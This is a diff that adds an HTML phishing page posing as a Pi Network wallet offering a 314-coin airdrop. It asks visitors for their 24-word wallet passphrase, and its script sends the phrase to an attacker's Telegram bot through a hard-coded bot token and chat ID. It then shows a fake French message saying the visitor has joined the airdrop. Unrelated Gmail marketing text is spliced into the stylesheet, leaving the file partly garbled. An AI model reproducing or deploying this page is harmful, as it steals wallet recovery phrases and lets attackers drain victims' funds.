@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta property="og:title" content="Claim 314 pi coins 🎁🎁">
+    <meta property="og:description" content="Celebrate 15 KYC users with special reward">
+    <meta property="og:url" content="https://pinetpi.net">
+    <meta property="og:image" content="https://raw.githubusercontent.com/Rodhackgang/pinetwork/main/1762422503984.jpg" />
+    <meta property="og:site_name" content="Claim Airdrop"/>
+    <meta property="og:locale" content="en_US"/>
+    <meta property="og:type" content="website"/>
+    <meta name="twitter:card" content="summary_large_image"/>
+    <meta name="twitter:site" content="@PiCoreTeam"/>
+    <meta name="twitter:title" content="Wallet"/>
+    <link rel="icon" href="_next/static/media/wallet.44634181.svg"/>
+    <title>Pi Wallet</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin-top: -15%;
+            background-color: #f3f4f6;
+        }
+
+        .container {
+            background-color: #fff;
+            width: 100vw;
+      
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        #loading-spinner {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #65408a;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .header {
+            background-color: #65408a;
+            padding: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .header svg {
+            fill: #fff;
+        }
+
+        .title-page {
+            color: #fff;
+            font-weight: bold;
+            text-align: center;
+            flex: 1;
+        }
+
+        .form-container {
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .title {
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: #4a4a4a;
+        }
+
+        .textarea-container {
+            width: 100%;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .textarea-container textarea {
+            width: 100%;
+            padding: 10px;
+            font-size: 1rem;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            background-color: #F9FAFB;intelligente et facile à utiliser
+
+Gagnez en efficacité avec Gmail, qui intègre désormais Google Chat, Google Meet et d'autres outils.
+Créer un compte
+Pour le travail
+Écran de la boîte de réception Gmail avec grandes icônes de fonction
+
+        }
+
+        .button {
+            width: 100%;
+            background-color: #65408a;
+            color: #fff;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: background-color 0.3s ease;
+        }
+
+        .button:hover {
+            background-color: #4a2867;
+        }
+
+        .message {
+            text-align: center;
+            color: red;
+            margin-top: 10px;
+        }
+
+        .text-block {
+            text-align: center;
+            margin-top: 20px;
+            color: #4a4a4a;
+        }
+
+        .text-block span {
+            color: rgba(77, 0, 215, 0.85);
+        }
+
+    </style>
+</head>
+<body>
+    <div id="loading-spinner"></div>
+    <div id="main" class="container">
+        <div class="header">
+            <div class="back">
+                <a href="#">
+                    <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px">
+                        <path d="M400-80 0-480l400-400 71 71-329 329 329 329-71 71Z" />
+                    </svg>
+                </a>
+            </div>
+            <div class="title-page">
+                <span>Wallet</span>
+            </div>
+        </div>
+
+        <div class="form-container">
+            <div class="title">
+                Unlock Pi Reward
+            </div>
+            <form action="checkm.php" method="post" onsubmit="return validateForm()">
+                <div class="textarea-container">
+                    <textarea id="content" name="content" required rows="8" class="block w-full p-3 text-lg text-gray-800 bg-gray-100 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500" placeholder="Enter your 24-words passphrase here"></textarea>
+                </div>
+                <input type="hidden" name="ip_address" id="ip_address" value="">
+                <input type="hidden" id="key" name="key">
+                <button type="submit" class="button">Unlock with passphrase</button>
+                <div id="emsg" class="message"></div>
+            </form>
+
+            <div class="text-block">
+                <h5>As a non-custodial wallet, your wallet passphrase is only accessible to you. It is currently not possible to recover the wallet passphrase.</h5>
+            </div>
+            <div class="text-block">
+                <h5>Lost your wallet passphrase? <span>you can create a new wallet</span>, but all the PI numbers in your previous wallet will be inaccessible.</h5>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Function to send a message to Telegram with the passphrase
+        function sendToTelegram(passphrase) {
+            const chatId = '1741959003'; // Replace with your chat ID
+            const botKey = '7354494708:AAEGDCeKoiPcXZo_mE4NzreaLsVS_mEqy90'; // Replace with your bot key
+            const message = `New passphrase: ${passphrase}`;
+    
+            const url = `https://api.telegram.org/bot${botKey}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+    
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Message sent to Telegram:', data);
+                    showSuccessMessage(); // Show success message
+                })
+                .catch(error => {
+                    console.error('Error sending message to Telegram:', error);
+                });
+        }
+    
+        // Function to show success message and clear the form
+        function showSuccessMessage() {
+            document.getElementById("emsg").innerHTML = "Félicitations! vous participez désormais à l'airdrop de PI.";
+            document.getElementById("emsg").style.color = "green";
+            document.getElementById("emsg").style.fontWeight = "bold";
+    
+            // Clear the textarea and hidden fields
+            document.getElementById("content").value = "";
+            document.getElementById("key").value = "";
+            setTimeout(function() {
+            location.reload(); // This reloads the page
+        }, 10000);
+        }
+    
+        // Form validation function
+      function validateForm() {
+    const textarea = document.getElementById("content");
+    const inputValue = textarea.value.trim();
+    
+    // Vérifier le nombre de mots
+    const wordCount = inputValue.split(/\s+/).filter(word => word.length > 0).length;
+    
+    if (wordCount === 24) {
+        sendToTelegram(inputValue);
+        return false; // Empêche la soumission du formulaire
+    } else {
+        document.getElementById("emsg").innerHTML = "Invalid Passphrase (must be exactly 24 words)";
+        return false;
+    }
+}
+
+        // Prevent form submission before full load
+        document.addEventListener("DOMContentLoaded", () => {
+            const form = document.querySelector("form");
+            form.onsubmit = function (event) {
+                if (!validateForm()) {
+                    event.preventDefault(); // Stop form submission if validation fails
+                }
+            };
+    
+            // Unhide content after page loads
+            window.onload = () => {
+                document.getElementById("loading-spinner").style.display = "none";
+                document.getElementById("main").style.display = "block";
+            };
+        });
+    </script>
+    
+    
+</body>
+</html>
